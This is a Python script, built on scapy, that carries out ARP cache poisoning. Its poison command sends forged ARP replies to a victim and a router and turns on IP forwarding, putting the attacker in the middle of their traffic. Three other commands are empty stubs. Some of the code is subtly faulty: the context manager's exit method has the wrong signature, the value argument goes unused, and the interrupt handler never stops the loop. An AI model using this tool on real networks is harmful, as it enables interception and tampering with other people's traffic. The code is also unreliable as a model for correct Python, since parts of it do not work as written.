#!/usr/bin/env python


import os
import sys
import argh
import time
import signal

from scapy.all import *


def originalMAC(ip):
    ans, unans = srp(ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r[Ether].src


def assure_root(fn):
    def wrapper(*args, **kwargs):
        if not os.geteuid() == 0:
            sys.exit("\nOnly root can run this script\n")
        return fn(*args, **kwargs)
    return wrapper


class Syscfg(object):

    def __init__(self, filepath, value):
        self._filepath = filepath
        self._new_value = value

    @assure_root
    def __enter__(self):
        with open(self._filepath, 'r') as f:
            self._old_value = f.read()
        with open(self._filepath, 'w') as f:
            f.write('1\n')

    def __exit__(self):
        with open(self._filepath, 'w') as f:
            f.write(self._old_value)


def poison(routerIP, routerMAC, victimIP, victimMAC):
    def _signal_handler(signal, frame):
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

    with Syscfg('/proc/sys/net/ipv4/ip_forward', '1\n'):
        signal.signal(signal.SIGINT, _signal_handler)
        while True:
            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
            time.sleep(2)


def verify():
    pass


def monitor():
    pass


def display():
    pass


if __name__ == '__main__':
    argh.dispatch_commands([poison, verify, monitor, display])
